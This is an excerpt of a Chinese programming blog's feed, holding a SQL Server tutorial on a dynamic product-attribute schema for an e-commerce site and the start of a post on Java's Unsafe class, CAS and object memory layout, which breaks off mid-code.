class="keyword">select</span> <span class="number">4</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="string">&#x27;Iphone 6&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">5</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="string">&#x27;Iphone 6sp&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">6</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="string">&#x27;小米4&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">7</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="string">&#x27;红米9&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">8</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="string">&#x27;贝雷帽 1999&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">9</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="string">&#x27;上衣 COACH 1941&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">10</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="string">&#x27;围脖 1945&#x27;</span></span><br><span class="line"><span class="keyword">go</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">--属性</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t2_Property(</span><br><span class="line">Property_id <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">50</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line"><span class="keyword">constraint</span> pk_Property primary <span class="keyword">key</span>(Property_id)</span><br><span class="line">)</span><br><span class="line"><span class="keyword">go</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t2_Property</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;颜色&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">2</span>,<span class="string">&#x27;屏幕尺寸&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">3</span>,<span class="string">&#x27;屏幕分辨率&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">4</span>,<span class="string">&#x27;CPU型号&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">5</span>,<span class="string">&#x27;硬盘容量&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">6</span>,<span class="string">&#x27;内存&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">7</span>,<span class="string">&#x27;重量&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">8</span>,<span class="string">&#x27;手机类型&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">9</span>,<span class="string">&#x27;材料&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">10</span>,<span class="string">&#x27;衣长&#x27;</span></span><br><span class="line"><span class="keyword">go</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">--属性值</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t2_PropertyValue(</span><br><span class="line">PropertyValue_id <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">Property_id <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line"><span class="keyword">Value</span> <span class="built_in">varchar</span>(<span class="number">50</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line"><span class="keyword">constraint</span> pk_PropertyValue primary <span class="keyword">key</span>(PropertyValue_id),</span><br><span class="line"><span class="keyword">constraint</span> fk_PropertyValue_Property <span class="keyword">foreign</span> <span class="keyword">key</span>(Property_id) <span class="keyword">references</span> t2_Property(Property_id)</span><br><span class="line">)</span><br><span class="line"><span class="keyword">go</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t2_PropertyValue</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;白色&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">2</span>,<span class="number">1</span>,<span class="string">&#x27;黑色&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">3</span>,<span class="number">1</span>,<span class="string">&#x27;红色&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">4</span>,<span class="number">1</span>,<span class="string">&#x27;蓝色&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">5</span>,<span class="number">1</span>,<span class="string">&#x27;灰色&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">6</span>,<span class="number">2</span>,<span class="string">&#x27;360X540&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">7</span>,<span class="number">2</span>,<span class="string">&#x27;540X720&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">8</span>,<span class="number">2</span>,<span class="string">&#x27;720X960&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">9</span>,<span class="number">2</span>,<span class="string">&#x27;720X1280&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">10</span>,<span class="number">6</span>,<span class="string">&#x27;1 GB&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">11</span>,<span class="number">6</span>,<span class="string">&#x27;2 GB&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">12</span>,<span class="number">6</span>,<span class="string">&#x27;4 GB&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">13</span>,<span class="number">6</span>,<span class="string">&#x27;8 GB&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">14</span>,<span class="number">7</span>,<span class="string">&#x27;100 g&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">15</span>,<span class="number">7</span>,<span class="string">&#x27;200 g&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">16</span>,<span class="number">7</span>,<span class="string">&#x27;300 g&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">17</span>,<span class="number">7</span>,<span class="string">&#x27;400 g&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">18</span>,<span class="number">9</span>,<span class="string">&#x27;棉&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">19</span>,<span class="number">9</span>,<span class="string">&#x27;亚麻&#x27;</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">20</span>,<span class="number">9</span>,<span class="string">&#x27;人造纤维&#x27;</span></span><br><span class="line"><span class="keyword">go</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">--产品属性值表(id,产品,属性,属性值)</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> t2_ProductPropertyValue(</span><br><span class="line">ProductPropertyValue_id <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">Procduct_id <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">Property_id <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">PropertyValue_id <span class="built_in">int</span> <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line"><span class="keyword">constraint</span> pk_ProductPropertyValue primary <span class="keyword">key</span>(ProductPropertyValue_id),</span><br><span class="line"><span class="keyword">constraint</span> fk_ProductPropertyValue_Procduct <span class="keyword">foreign</span> <span class="keyword">key</span>(Procduct_id) <span class="keyword">references</span> t2_Procduct(Procduct_id),</span><br><span class="line"><span class="keyword">constraint</span> fk_ProductPropertyValue_Property <span class="keyword">foreign</span> <span class="keyword">key</span>(Property_id) <span class="keyword">references</span> t2_Property(Property_id),</span><br><span class="line"><span class="keyword">constraint</span> fk_ProductPropertyValue_PropertyValue <span class="keyword">foreign</span> <span class="keyword">key</span>(PropertyValue_id) <span class="keyword">references</span> t2_PropertyValue(PropertyValue_id)</span><br><span class="line">)</span><br><span class="line"><span class="keyword">go</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t2_ProductPropertyValue</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">3</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">4</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">4</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">5</span>,<span class="number">7</span>,<span class="number">1</span>,<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">6</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">5</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">7</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">6</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">8</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">7</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">9</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">9</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">10</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">11</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">11</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">12</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">12</span>,<span class="number">1</span>,<span class="number">7</span>,<span class="number">13</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">13</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">14</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">14</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">16</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">15</span>,<span class="number">7</span>,<span class="number">7</span>,<span class="number">17</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">16</span>,<span class="number">9</span>,<span class="number">9</span>,<span class="number">18</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">17</span>,<span class="number">9</span>,<span class="number">9</span>,<span class="number">19</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">18</span>,<span class="number">9</span>,<span class="number">9</span>,<span class="number">20</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">19</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">19</span> <span class="keyword">union</span> <span class="keyword">all</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">20</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">20</span></span><br><span class="line"><span class="keyword">go</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> t2_Category<span class="comment">--类别</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> t2_Brand<span class="comment">--品牌</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> t2_Procduct<span class="comment">--产品</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> t2_Property<span class="comment">--属性</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> t2_PropertyValue<span class="comment">--属性值</span></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> t2_ProductPropertyValue<span class="comment">--产品属性值表</span></span><br></pre></td></tr></table></figure><p><strong>关系图：</strong></p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20161118021338533.jpg" alt="img"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> t3.name <span class="keyword">as</span> 类别,t4.name <span class="keyword">as</span> 品牌,t2.name <span class="keyword">as</span> 产品,t5.name <span class="keyword">as</span> 属性,t6.Value <span class="keyword">as</span> 属性值</span><br><span class="line"><span class="keyword">from</span> t2_ProductPropertyValue t1 </span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> t2_Procduct t2 <span class="keyword">on</span> t1.Procduct_id=t2.Procduct_id</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> t2_Category t3 <span class="keyword">on</span> t2.Categories_id=t3.Categories_id</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> t2_Brand t4 <span class="keyword">on</span> t2.Brand_id=t4.Brand_id</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> t2_Property t5 <span class="keyword">on</span> t1.Property_id=t5.Property_id</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> t2_PropertyValue t6 <span class="keyword">on</span> t1.PropertyValue_id=t6.PropertyValue_id</span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> t3.name,t4.name,t2.name,t5.name,t6.Value</span><br><span class="line"><span class="keyword">go</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20161118020239032.jpg" alt="img"></p><p>这是当前不同的产品，这里是详细的产品参数。无论怎么搜索产品，都能匹配出来。对于大型网站，所有的类型最好预先定义，让客户选择就行，否则商家随便定义各属性的值的话，记录将非常多（如颜色：赭石色，土黄色，深红色……）。</p><p>如果新增一款产品，如 “<strong>无人机</strong>” ，参数如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">===== 新增产品：无人机 =====</span></span><br><span class="line"><span class="comment">类别：电器电子（已存在）</span></span><br><span class="line"><span class="comment">品牌：大疆</span></span><br><span class="line"><span class="comment">产品：无人机</span></span><br><span class="line"><span class="comment">属性：颜色、重量、轴数  （&quot;颜色&quot;、&quot;重量&quot; 已存在）</span></span><br><span class="line"><span class="comment">属性值：&#123;颜色:白色; 重量:1KG; 轴数:6; &#125;  （&quot;白色&quot; 已存在）</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>只需要添加没有的记录就行，当然添加前需要判断是否存在。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--新增</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t2_Brand(Brand_id,<span class="keyword">name</span>) <span class="keyword">values</span>(<span class="number">8</span>,<span class="string">&#x27;大疆&#x27;</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t2_Procduct(Procduct_id,Categories_id,Brand_id,<span class="keyword">name</span>) <span class="keyword">values</span>(<span class="number">11</span>,<span class="number">1</span>,<span class="number">8</span>,<span class="string">&#x27;无人机&#x27;</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t2_Property(Property_id,<span class="keyword">name</span>) <span class="keyword">values</span>(<span class="number">11</span>,<span class="string">&#x27;轴数&#x27;</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t2_PropertyValue(PropertyValue_id,Property_id,<span class="keyword">Value</span>) <span class="keyword">values</span>(<span class="number">21</span>,<span class="number">7</span>,<span class="string">&#x27;1 KG&#x27;</span>),(<span class="number">22</span>,<span class="number">11</span>,<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> t2_ProductPropertyValue(ProductPropertyValue_id,Procduct_id,Property_id,PropertyValue_id)<span class="keyword">values</span>(<span class="number">21</span>,<span class="number">11</span>,<span class="number">1</span>,<span class="number">1</span>),(<span class="number">22</span>,<span class="number">11</span>,<span class="number">7</span>,<span class="number">21</span>),(<span class="number">23</span>,<span class="number">11</span>,<span class="number">11</span>,<span class="number">22</span>)</span><br><span class="line"><span class="keyword">go</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">select</span> t3.name <span class="keyword">as</span> 类别,t4.name <span class="keyword">as</span> 品牌,t2.name <span class="keyword">as</span> 产品,t5.name <span class="keyword">as</span> 属性,t6.Value <span class="keyword">as</span> 属性值</span><br><span class="line"><span class="keyword">from</span> t2_ProductPropertyValue t1 </span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> t2_Procduct t2 <span class="keyword">on</span> t1.Procduct_id=t2.Procduct_id</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> t2_Category t3 <span class="keyword">on</span> t2.Categories_id=t3.Categories_id</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> t2_Brand t4 <span class="keyword">on</span> t2.Brand_id=t4.Brand_id</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> t2_Property t5 <span class="keyword">on</span> t1.Property_id=t5.Property_id</span><br><span class="line"><span class="keyword">LEFT</span> <span class="keyword">JOIN</span> t2_PropertyValue t6 <span class="keyword">on</span> t1.PropertyValue_id=t6.PropertyValue_id</span><br><span class="line"><span class="keyword">where</span> t2.name = <span class="string">&#x27;无人机&#x27;</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> t3.name,t4.name,t2.name,t5.name,t6.Value</span><br><span class="line"><span class="keyword">go</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/20161118021207151.jpg" alt="img"></p><p>基本设计完成。</p>]]></content>
      
      
      <categories>
          
          <category> 数据库字段动态扩展 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UNSAFE和Java 内存布局</title>
      <link href="/unsafe-offset/"/>
      <url>/unsafe-offset/</url>
      
        <content type="html"><![CDATA[<p>在看CAS中经常会遇到unsafe.compareAndSwapInt(this, stateOffset, expect, update);很久很久以前看着就当眼熟;现在再看，结果对这个偏移量完全未知，于是有了这篇文章</p><a id="more"></a><h1 id="UNSAFE和Java-内存布局（深入理解：锁-反射-线程挂起-内存回收等）"><a href="#UNSAFE和Java-内存布局（深入理解：锁-反射-线程挂起-内存回收等）" class="headerlink" title="UNSAFE和Java 内存布局（深入理解：锁/反射/线程挂起/内存回收等）"></a>UNSAFE和Java 内存布局（深入理解：锁/反射/线程挂起/内存回收等）</h1><p>最近在翻ReentrantLock源码的时候，看到AQS（AbstractQueuedSynchronizer.java）里面有一段代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">compareAndSetState</span><span class="params">(<span class="keyword">int</span> expect, <span class="keyword">int</span> update)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// See below for intrinsics setup to support this</span></span><br><span class="line">    <span class="keyword">return</span> unsafe.compareAndSwapInt(<span class="keyword">this</span>, stateOffset, expect, update);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是经典的CAS的算法，这里包含两个陌生的东西，unsafe，stateOffset。</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> static <span class="keyword">final</span> Unsafe unsafe = Unsafe.getUnsafe();</span><br><span class="line"></span><br><span class="line">stateOffset = unsafe.objectFieldOffset</span><br><span class="line">                (AbstractQueuedSynchronizer.<span class="keyword">class</span>.getDeclaredField(<span class="string">&quot;state&quot;</span>));</span><br></pre></td></tr></table></figure><p>又发现stateOffset是跟AQS里面的state字段相关</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">volatile</span> <span class="keyword">int</span> state;</span><br></pre></td></tr></table></figure><p>然后我们又发现state是volatitle类型的，当然这是实现LOCK必备的。</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>这个stateOffset是什么，值是多少，由stateOffset能得到什么？由CAS的算法我们知道需要跟原值进行对比，所以大胆推测通过stateOffset可以得到state字段的值。</p><p>另外还有一个东西很让人好奇，UNSAFE是什么，能做什么？</p><h2 id="粗略认识"><a href="#粗略认识" class="headerlink" title="粗略认识"></a>粗略认识</h2><p>带着这两个问题，查了不少资料，这里我希望尽量能用白话的方式说明一下。<br> <strong>UNSAFE</strong>，顾名思义是不安全的，他的不安全是因为他的权限很大，可以调用操作系统底层直接操作内存空间，所以一般不允许使用。<br> 可参考：<a href="https://blog.csdn.net/aitangyong/article/details/46439375">java对象的内存布局(二):利用sun.misc.Unsafe获取类字段的偏移地址和读取字段的值</a><br> 我们注意到上面有一个方法</p><ul><li>stateOffset=unsafe.objectFieldOffset(field)  从方法名上可以这样理解：获取object对象的属性Field的偏移量。</li></ul><p>要理解这个偏移量，需要先了解java的内存模型</p><h2 id="Java内存模型"><a href="#Java内存模型" class="headerlink" title="Java内存模型"></a>Java内存模型</h2><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/offset_1.jpg" alt="offset_1"></p><p> 此文章值得认真阅读几遍： <a href="https://www.cnblogs.com/duanxz/p/4967042.html">java对象在内存中的结构（HotSpot虚拟机）</a></p><p>Java对象在内存中存储的布局可以分为三块区域：对象头（Header）、实例数据（Instance Data）和对齐填充（Padding），简单的理解：</p><ul><li><p><strong>对象头</strong>，对象是什么？</p></li><li><p><strong>实例数据</strong>，对象里有什么？</p></li><li><p>对齐填充</p><p>，不关键，目的是补齐位数达到8的倍数。</p><p>参考：</p><p>对象的内存布局</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/offset_2.jpg" alt="offset_2"></p><p>image.png</p></li></ul><p>举个简单的例子，如下类：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">VO</span> &#123;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> b = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>VO vo=new VO();的时候，Java内存中就开辟了一块地址，包含一个固定长度的对象头（假设是16字节，不同位数机器/对象头是否压缩都会影响对象头长度）+实例数据（4字节的a+4字节的b）+padding。</p><p>这里直接说结论，我们上面说的偏移量就是在这里体现，如上面a属性的偏移量就是16，b属性的偏移量就是20。</p><p>在unsafe类里面，我们发现一个方法unsafe.getInt(object, offset);<br> 通过unsafe.getInt(vo, 16) 就可以得到vo.a的值。是不是联想到反射了？其实java的反射底层就是用的UNSAFE（*<strong>具体如何实现，预留到以后研究*</strong>）。</p><h2 id="进一步思考"><a href="#进一步思考" class="headerlink" title="进一步思考"></a>进一步思考</h2><p><strong>如何知道一个类里面每个属性的偏移量？只根据偏移量，java怎么知道读取到哪里为止是这个属性的值？</strong></p><p>查看属性偏移量，推荐一个工具类jol：<a href="http://openjdk.java.net/projects/code-tools/jol/">http://openjdk.java.net/projects/code-tools/jol/</a><br> 用jol可以很方便的查看java的内存布局情况，结合一下代码讲解</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.openjdk.jol<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jol-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VO</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">long</span> b = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> String c= <span class="string">&quot;123&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> Object d= <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> e = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> f= <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String g= <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> Object h= <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">boolean</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> static void main(String[] args) throws Exception &#123;</span><br><span class="line">    System.<span class="keyword">out</span>.println(VM.current().details());</span><br><span class="line">    System.<span class="keyword">out</span>.println(ClassLayout.parseClass(VO.<span class="keyword">class</span>).toPrintable());</span><br><span class="line">    System.<span class="keyword">out</span>.println(<span class="string">&quot;=================&quot;</span>);</span><br><span class="line">    Unsafe unsafe = getUnsafeInstance();</span><br><span class="line">    VO vo = new VO();</span><br><span class="line">    